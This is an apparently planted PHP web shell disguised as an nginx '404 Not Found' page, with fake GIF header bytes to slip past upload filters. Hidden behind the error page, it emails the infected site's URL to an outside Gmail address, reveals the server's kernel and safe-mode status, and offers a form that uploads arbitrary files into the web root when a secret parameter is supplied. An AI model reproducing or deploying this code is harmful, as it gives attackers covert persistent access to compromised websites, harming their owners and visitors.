GIF89;aGIF89;aGIF89;a<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.6.2</center>
<?php
/*
simple hidden uploader
by Arch7
*/
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$python = '0xsec1337@gmail.com';
$mysql = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$perl = "URL: $mysql";
mail($python, "Akses Shell", $perl);
if(isset($_GET['0x'])) {
$safem = (@ini_get(strtolower('safe_mode')) == 'on') ? "<b>ON</b>" : "<b>OFF</b>";
$kern = php_uname();
$x = $_SERVER['HTTP_HOST'];
$r = $_SERVER['DOCUMENT_ROOT'];
$f = $_FILES['file']['name'];
$w = "http://".$x."/";
$l = $r.'/'.$f;
echo "<b>". $kern."</b><br>";
echo " Safe Mode: $safem<br>";
echo "<form enctype=multipart/form-data method=post><input type=file name=file><input type=submit name=up value=sikat!!></form>";
if(isset($_POST['up'])) {
if(is_writable($r)) {
if(copy($_FILES['file']['tmp_name'],$l)) {

echo "Done <a href=$w$f><b>$w$f</b></a>"; 
} else {
echo  "upload gagal"; }
} else {
if(copy($_FILES['file']['tmp_name'],$f)) {
echo "$f terupload di folder ini"; } else {
echo "upload gagal";
}}}}
?>
</body></html>
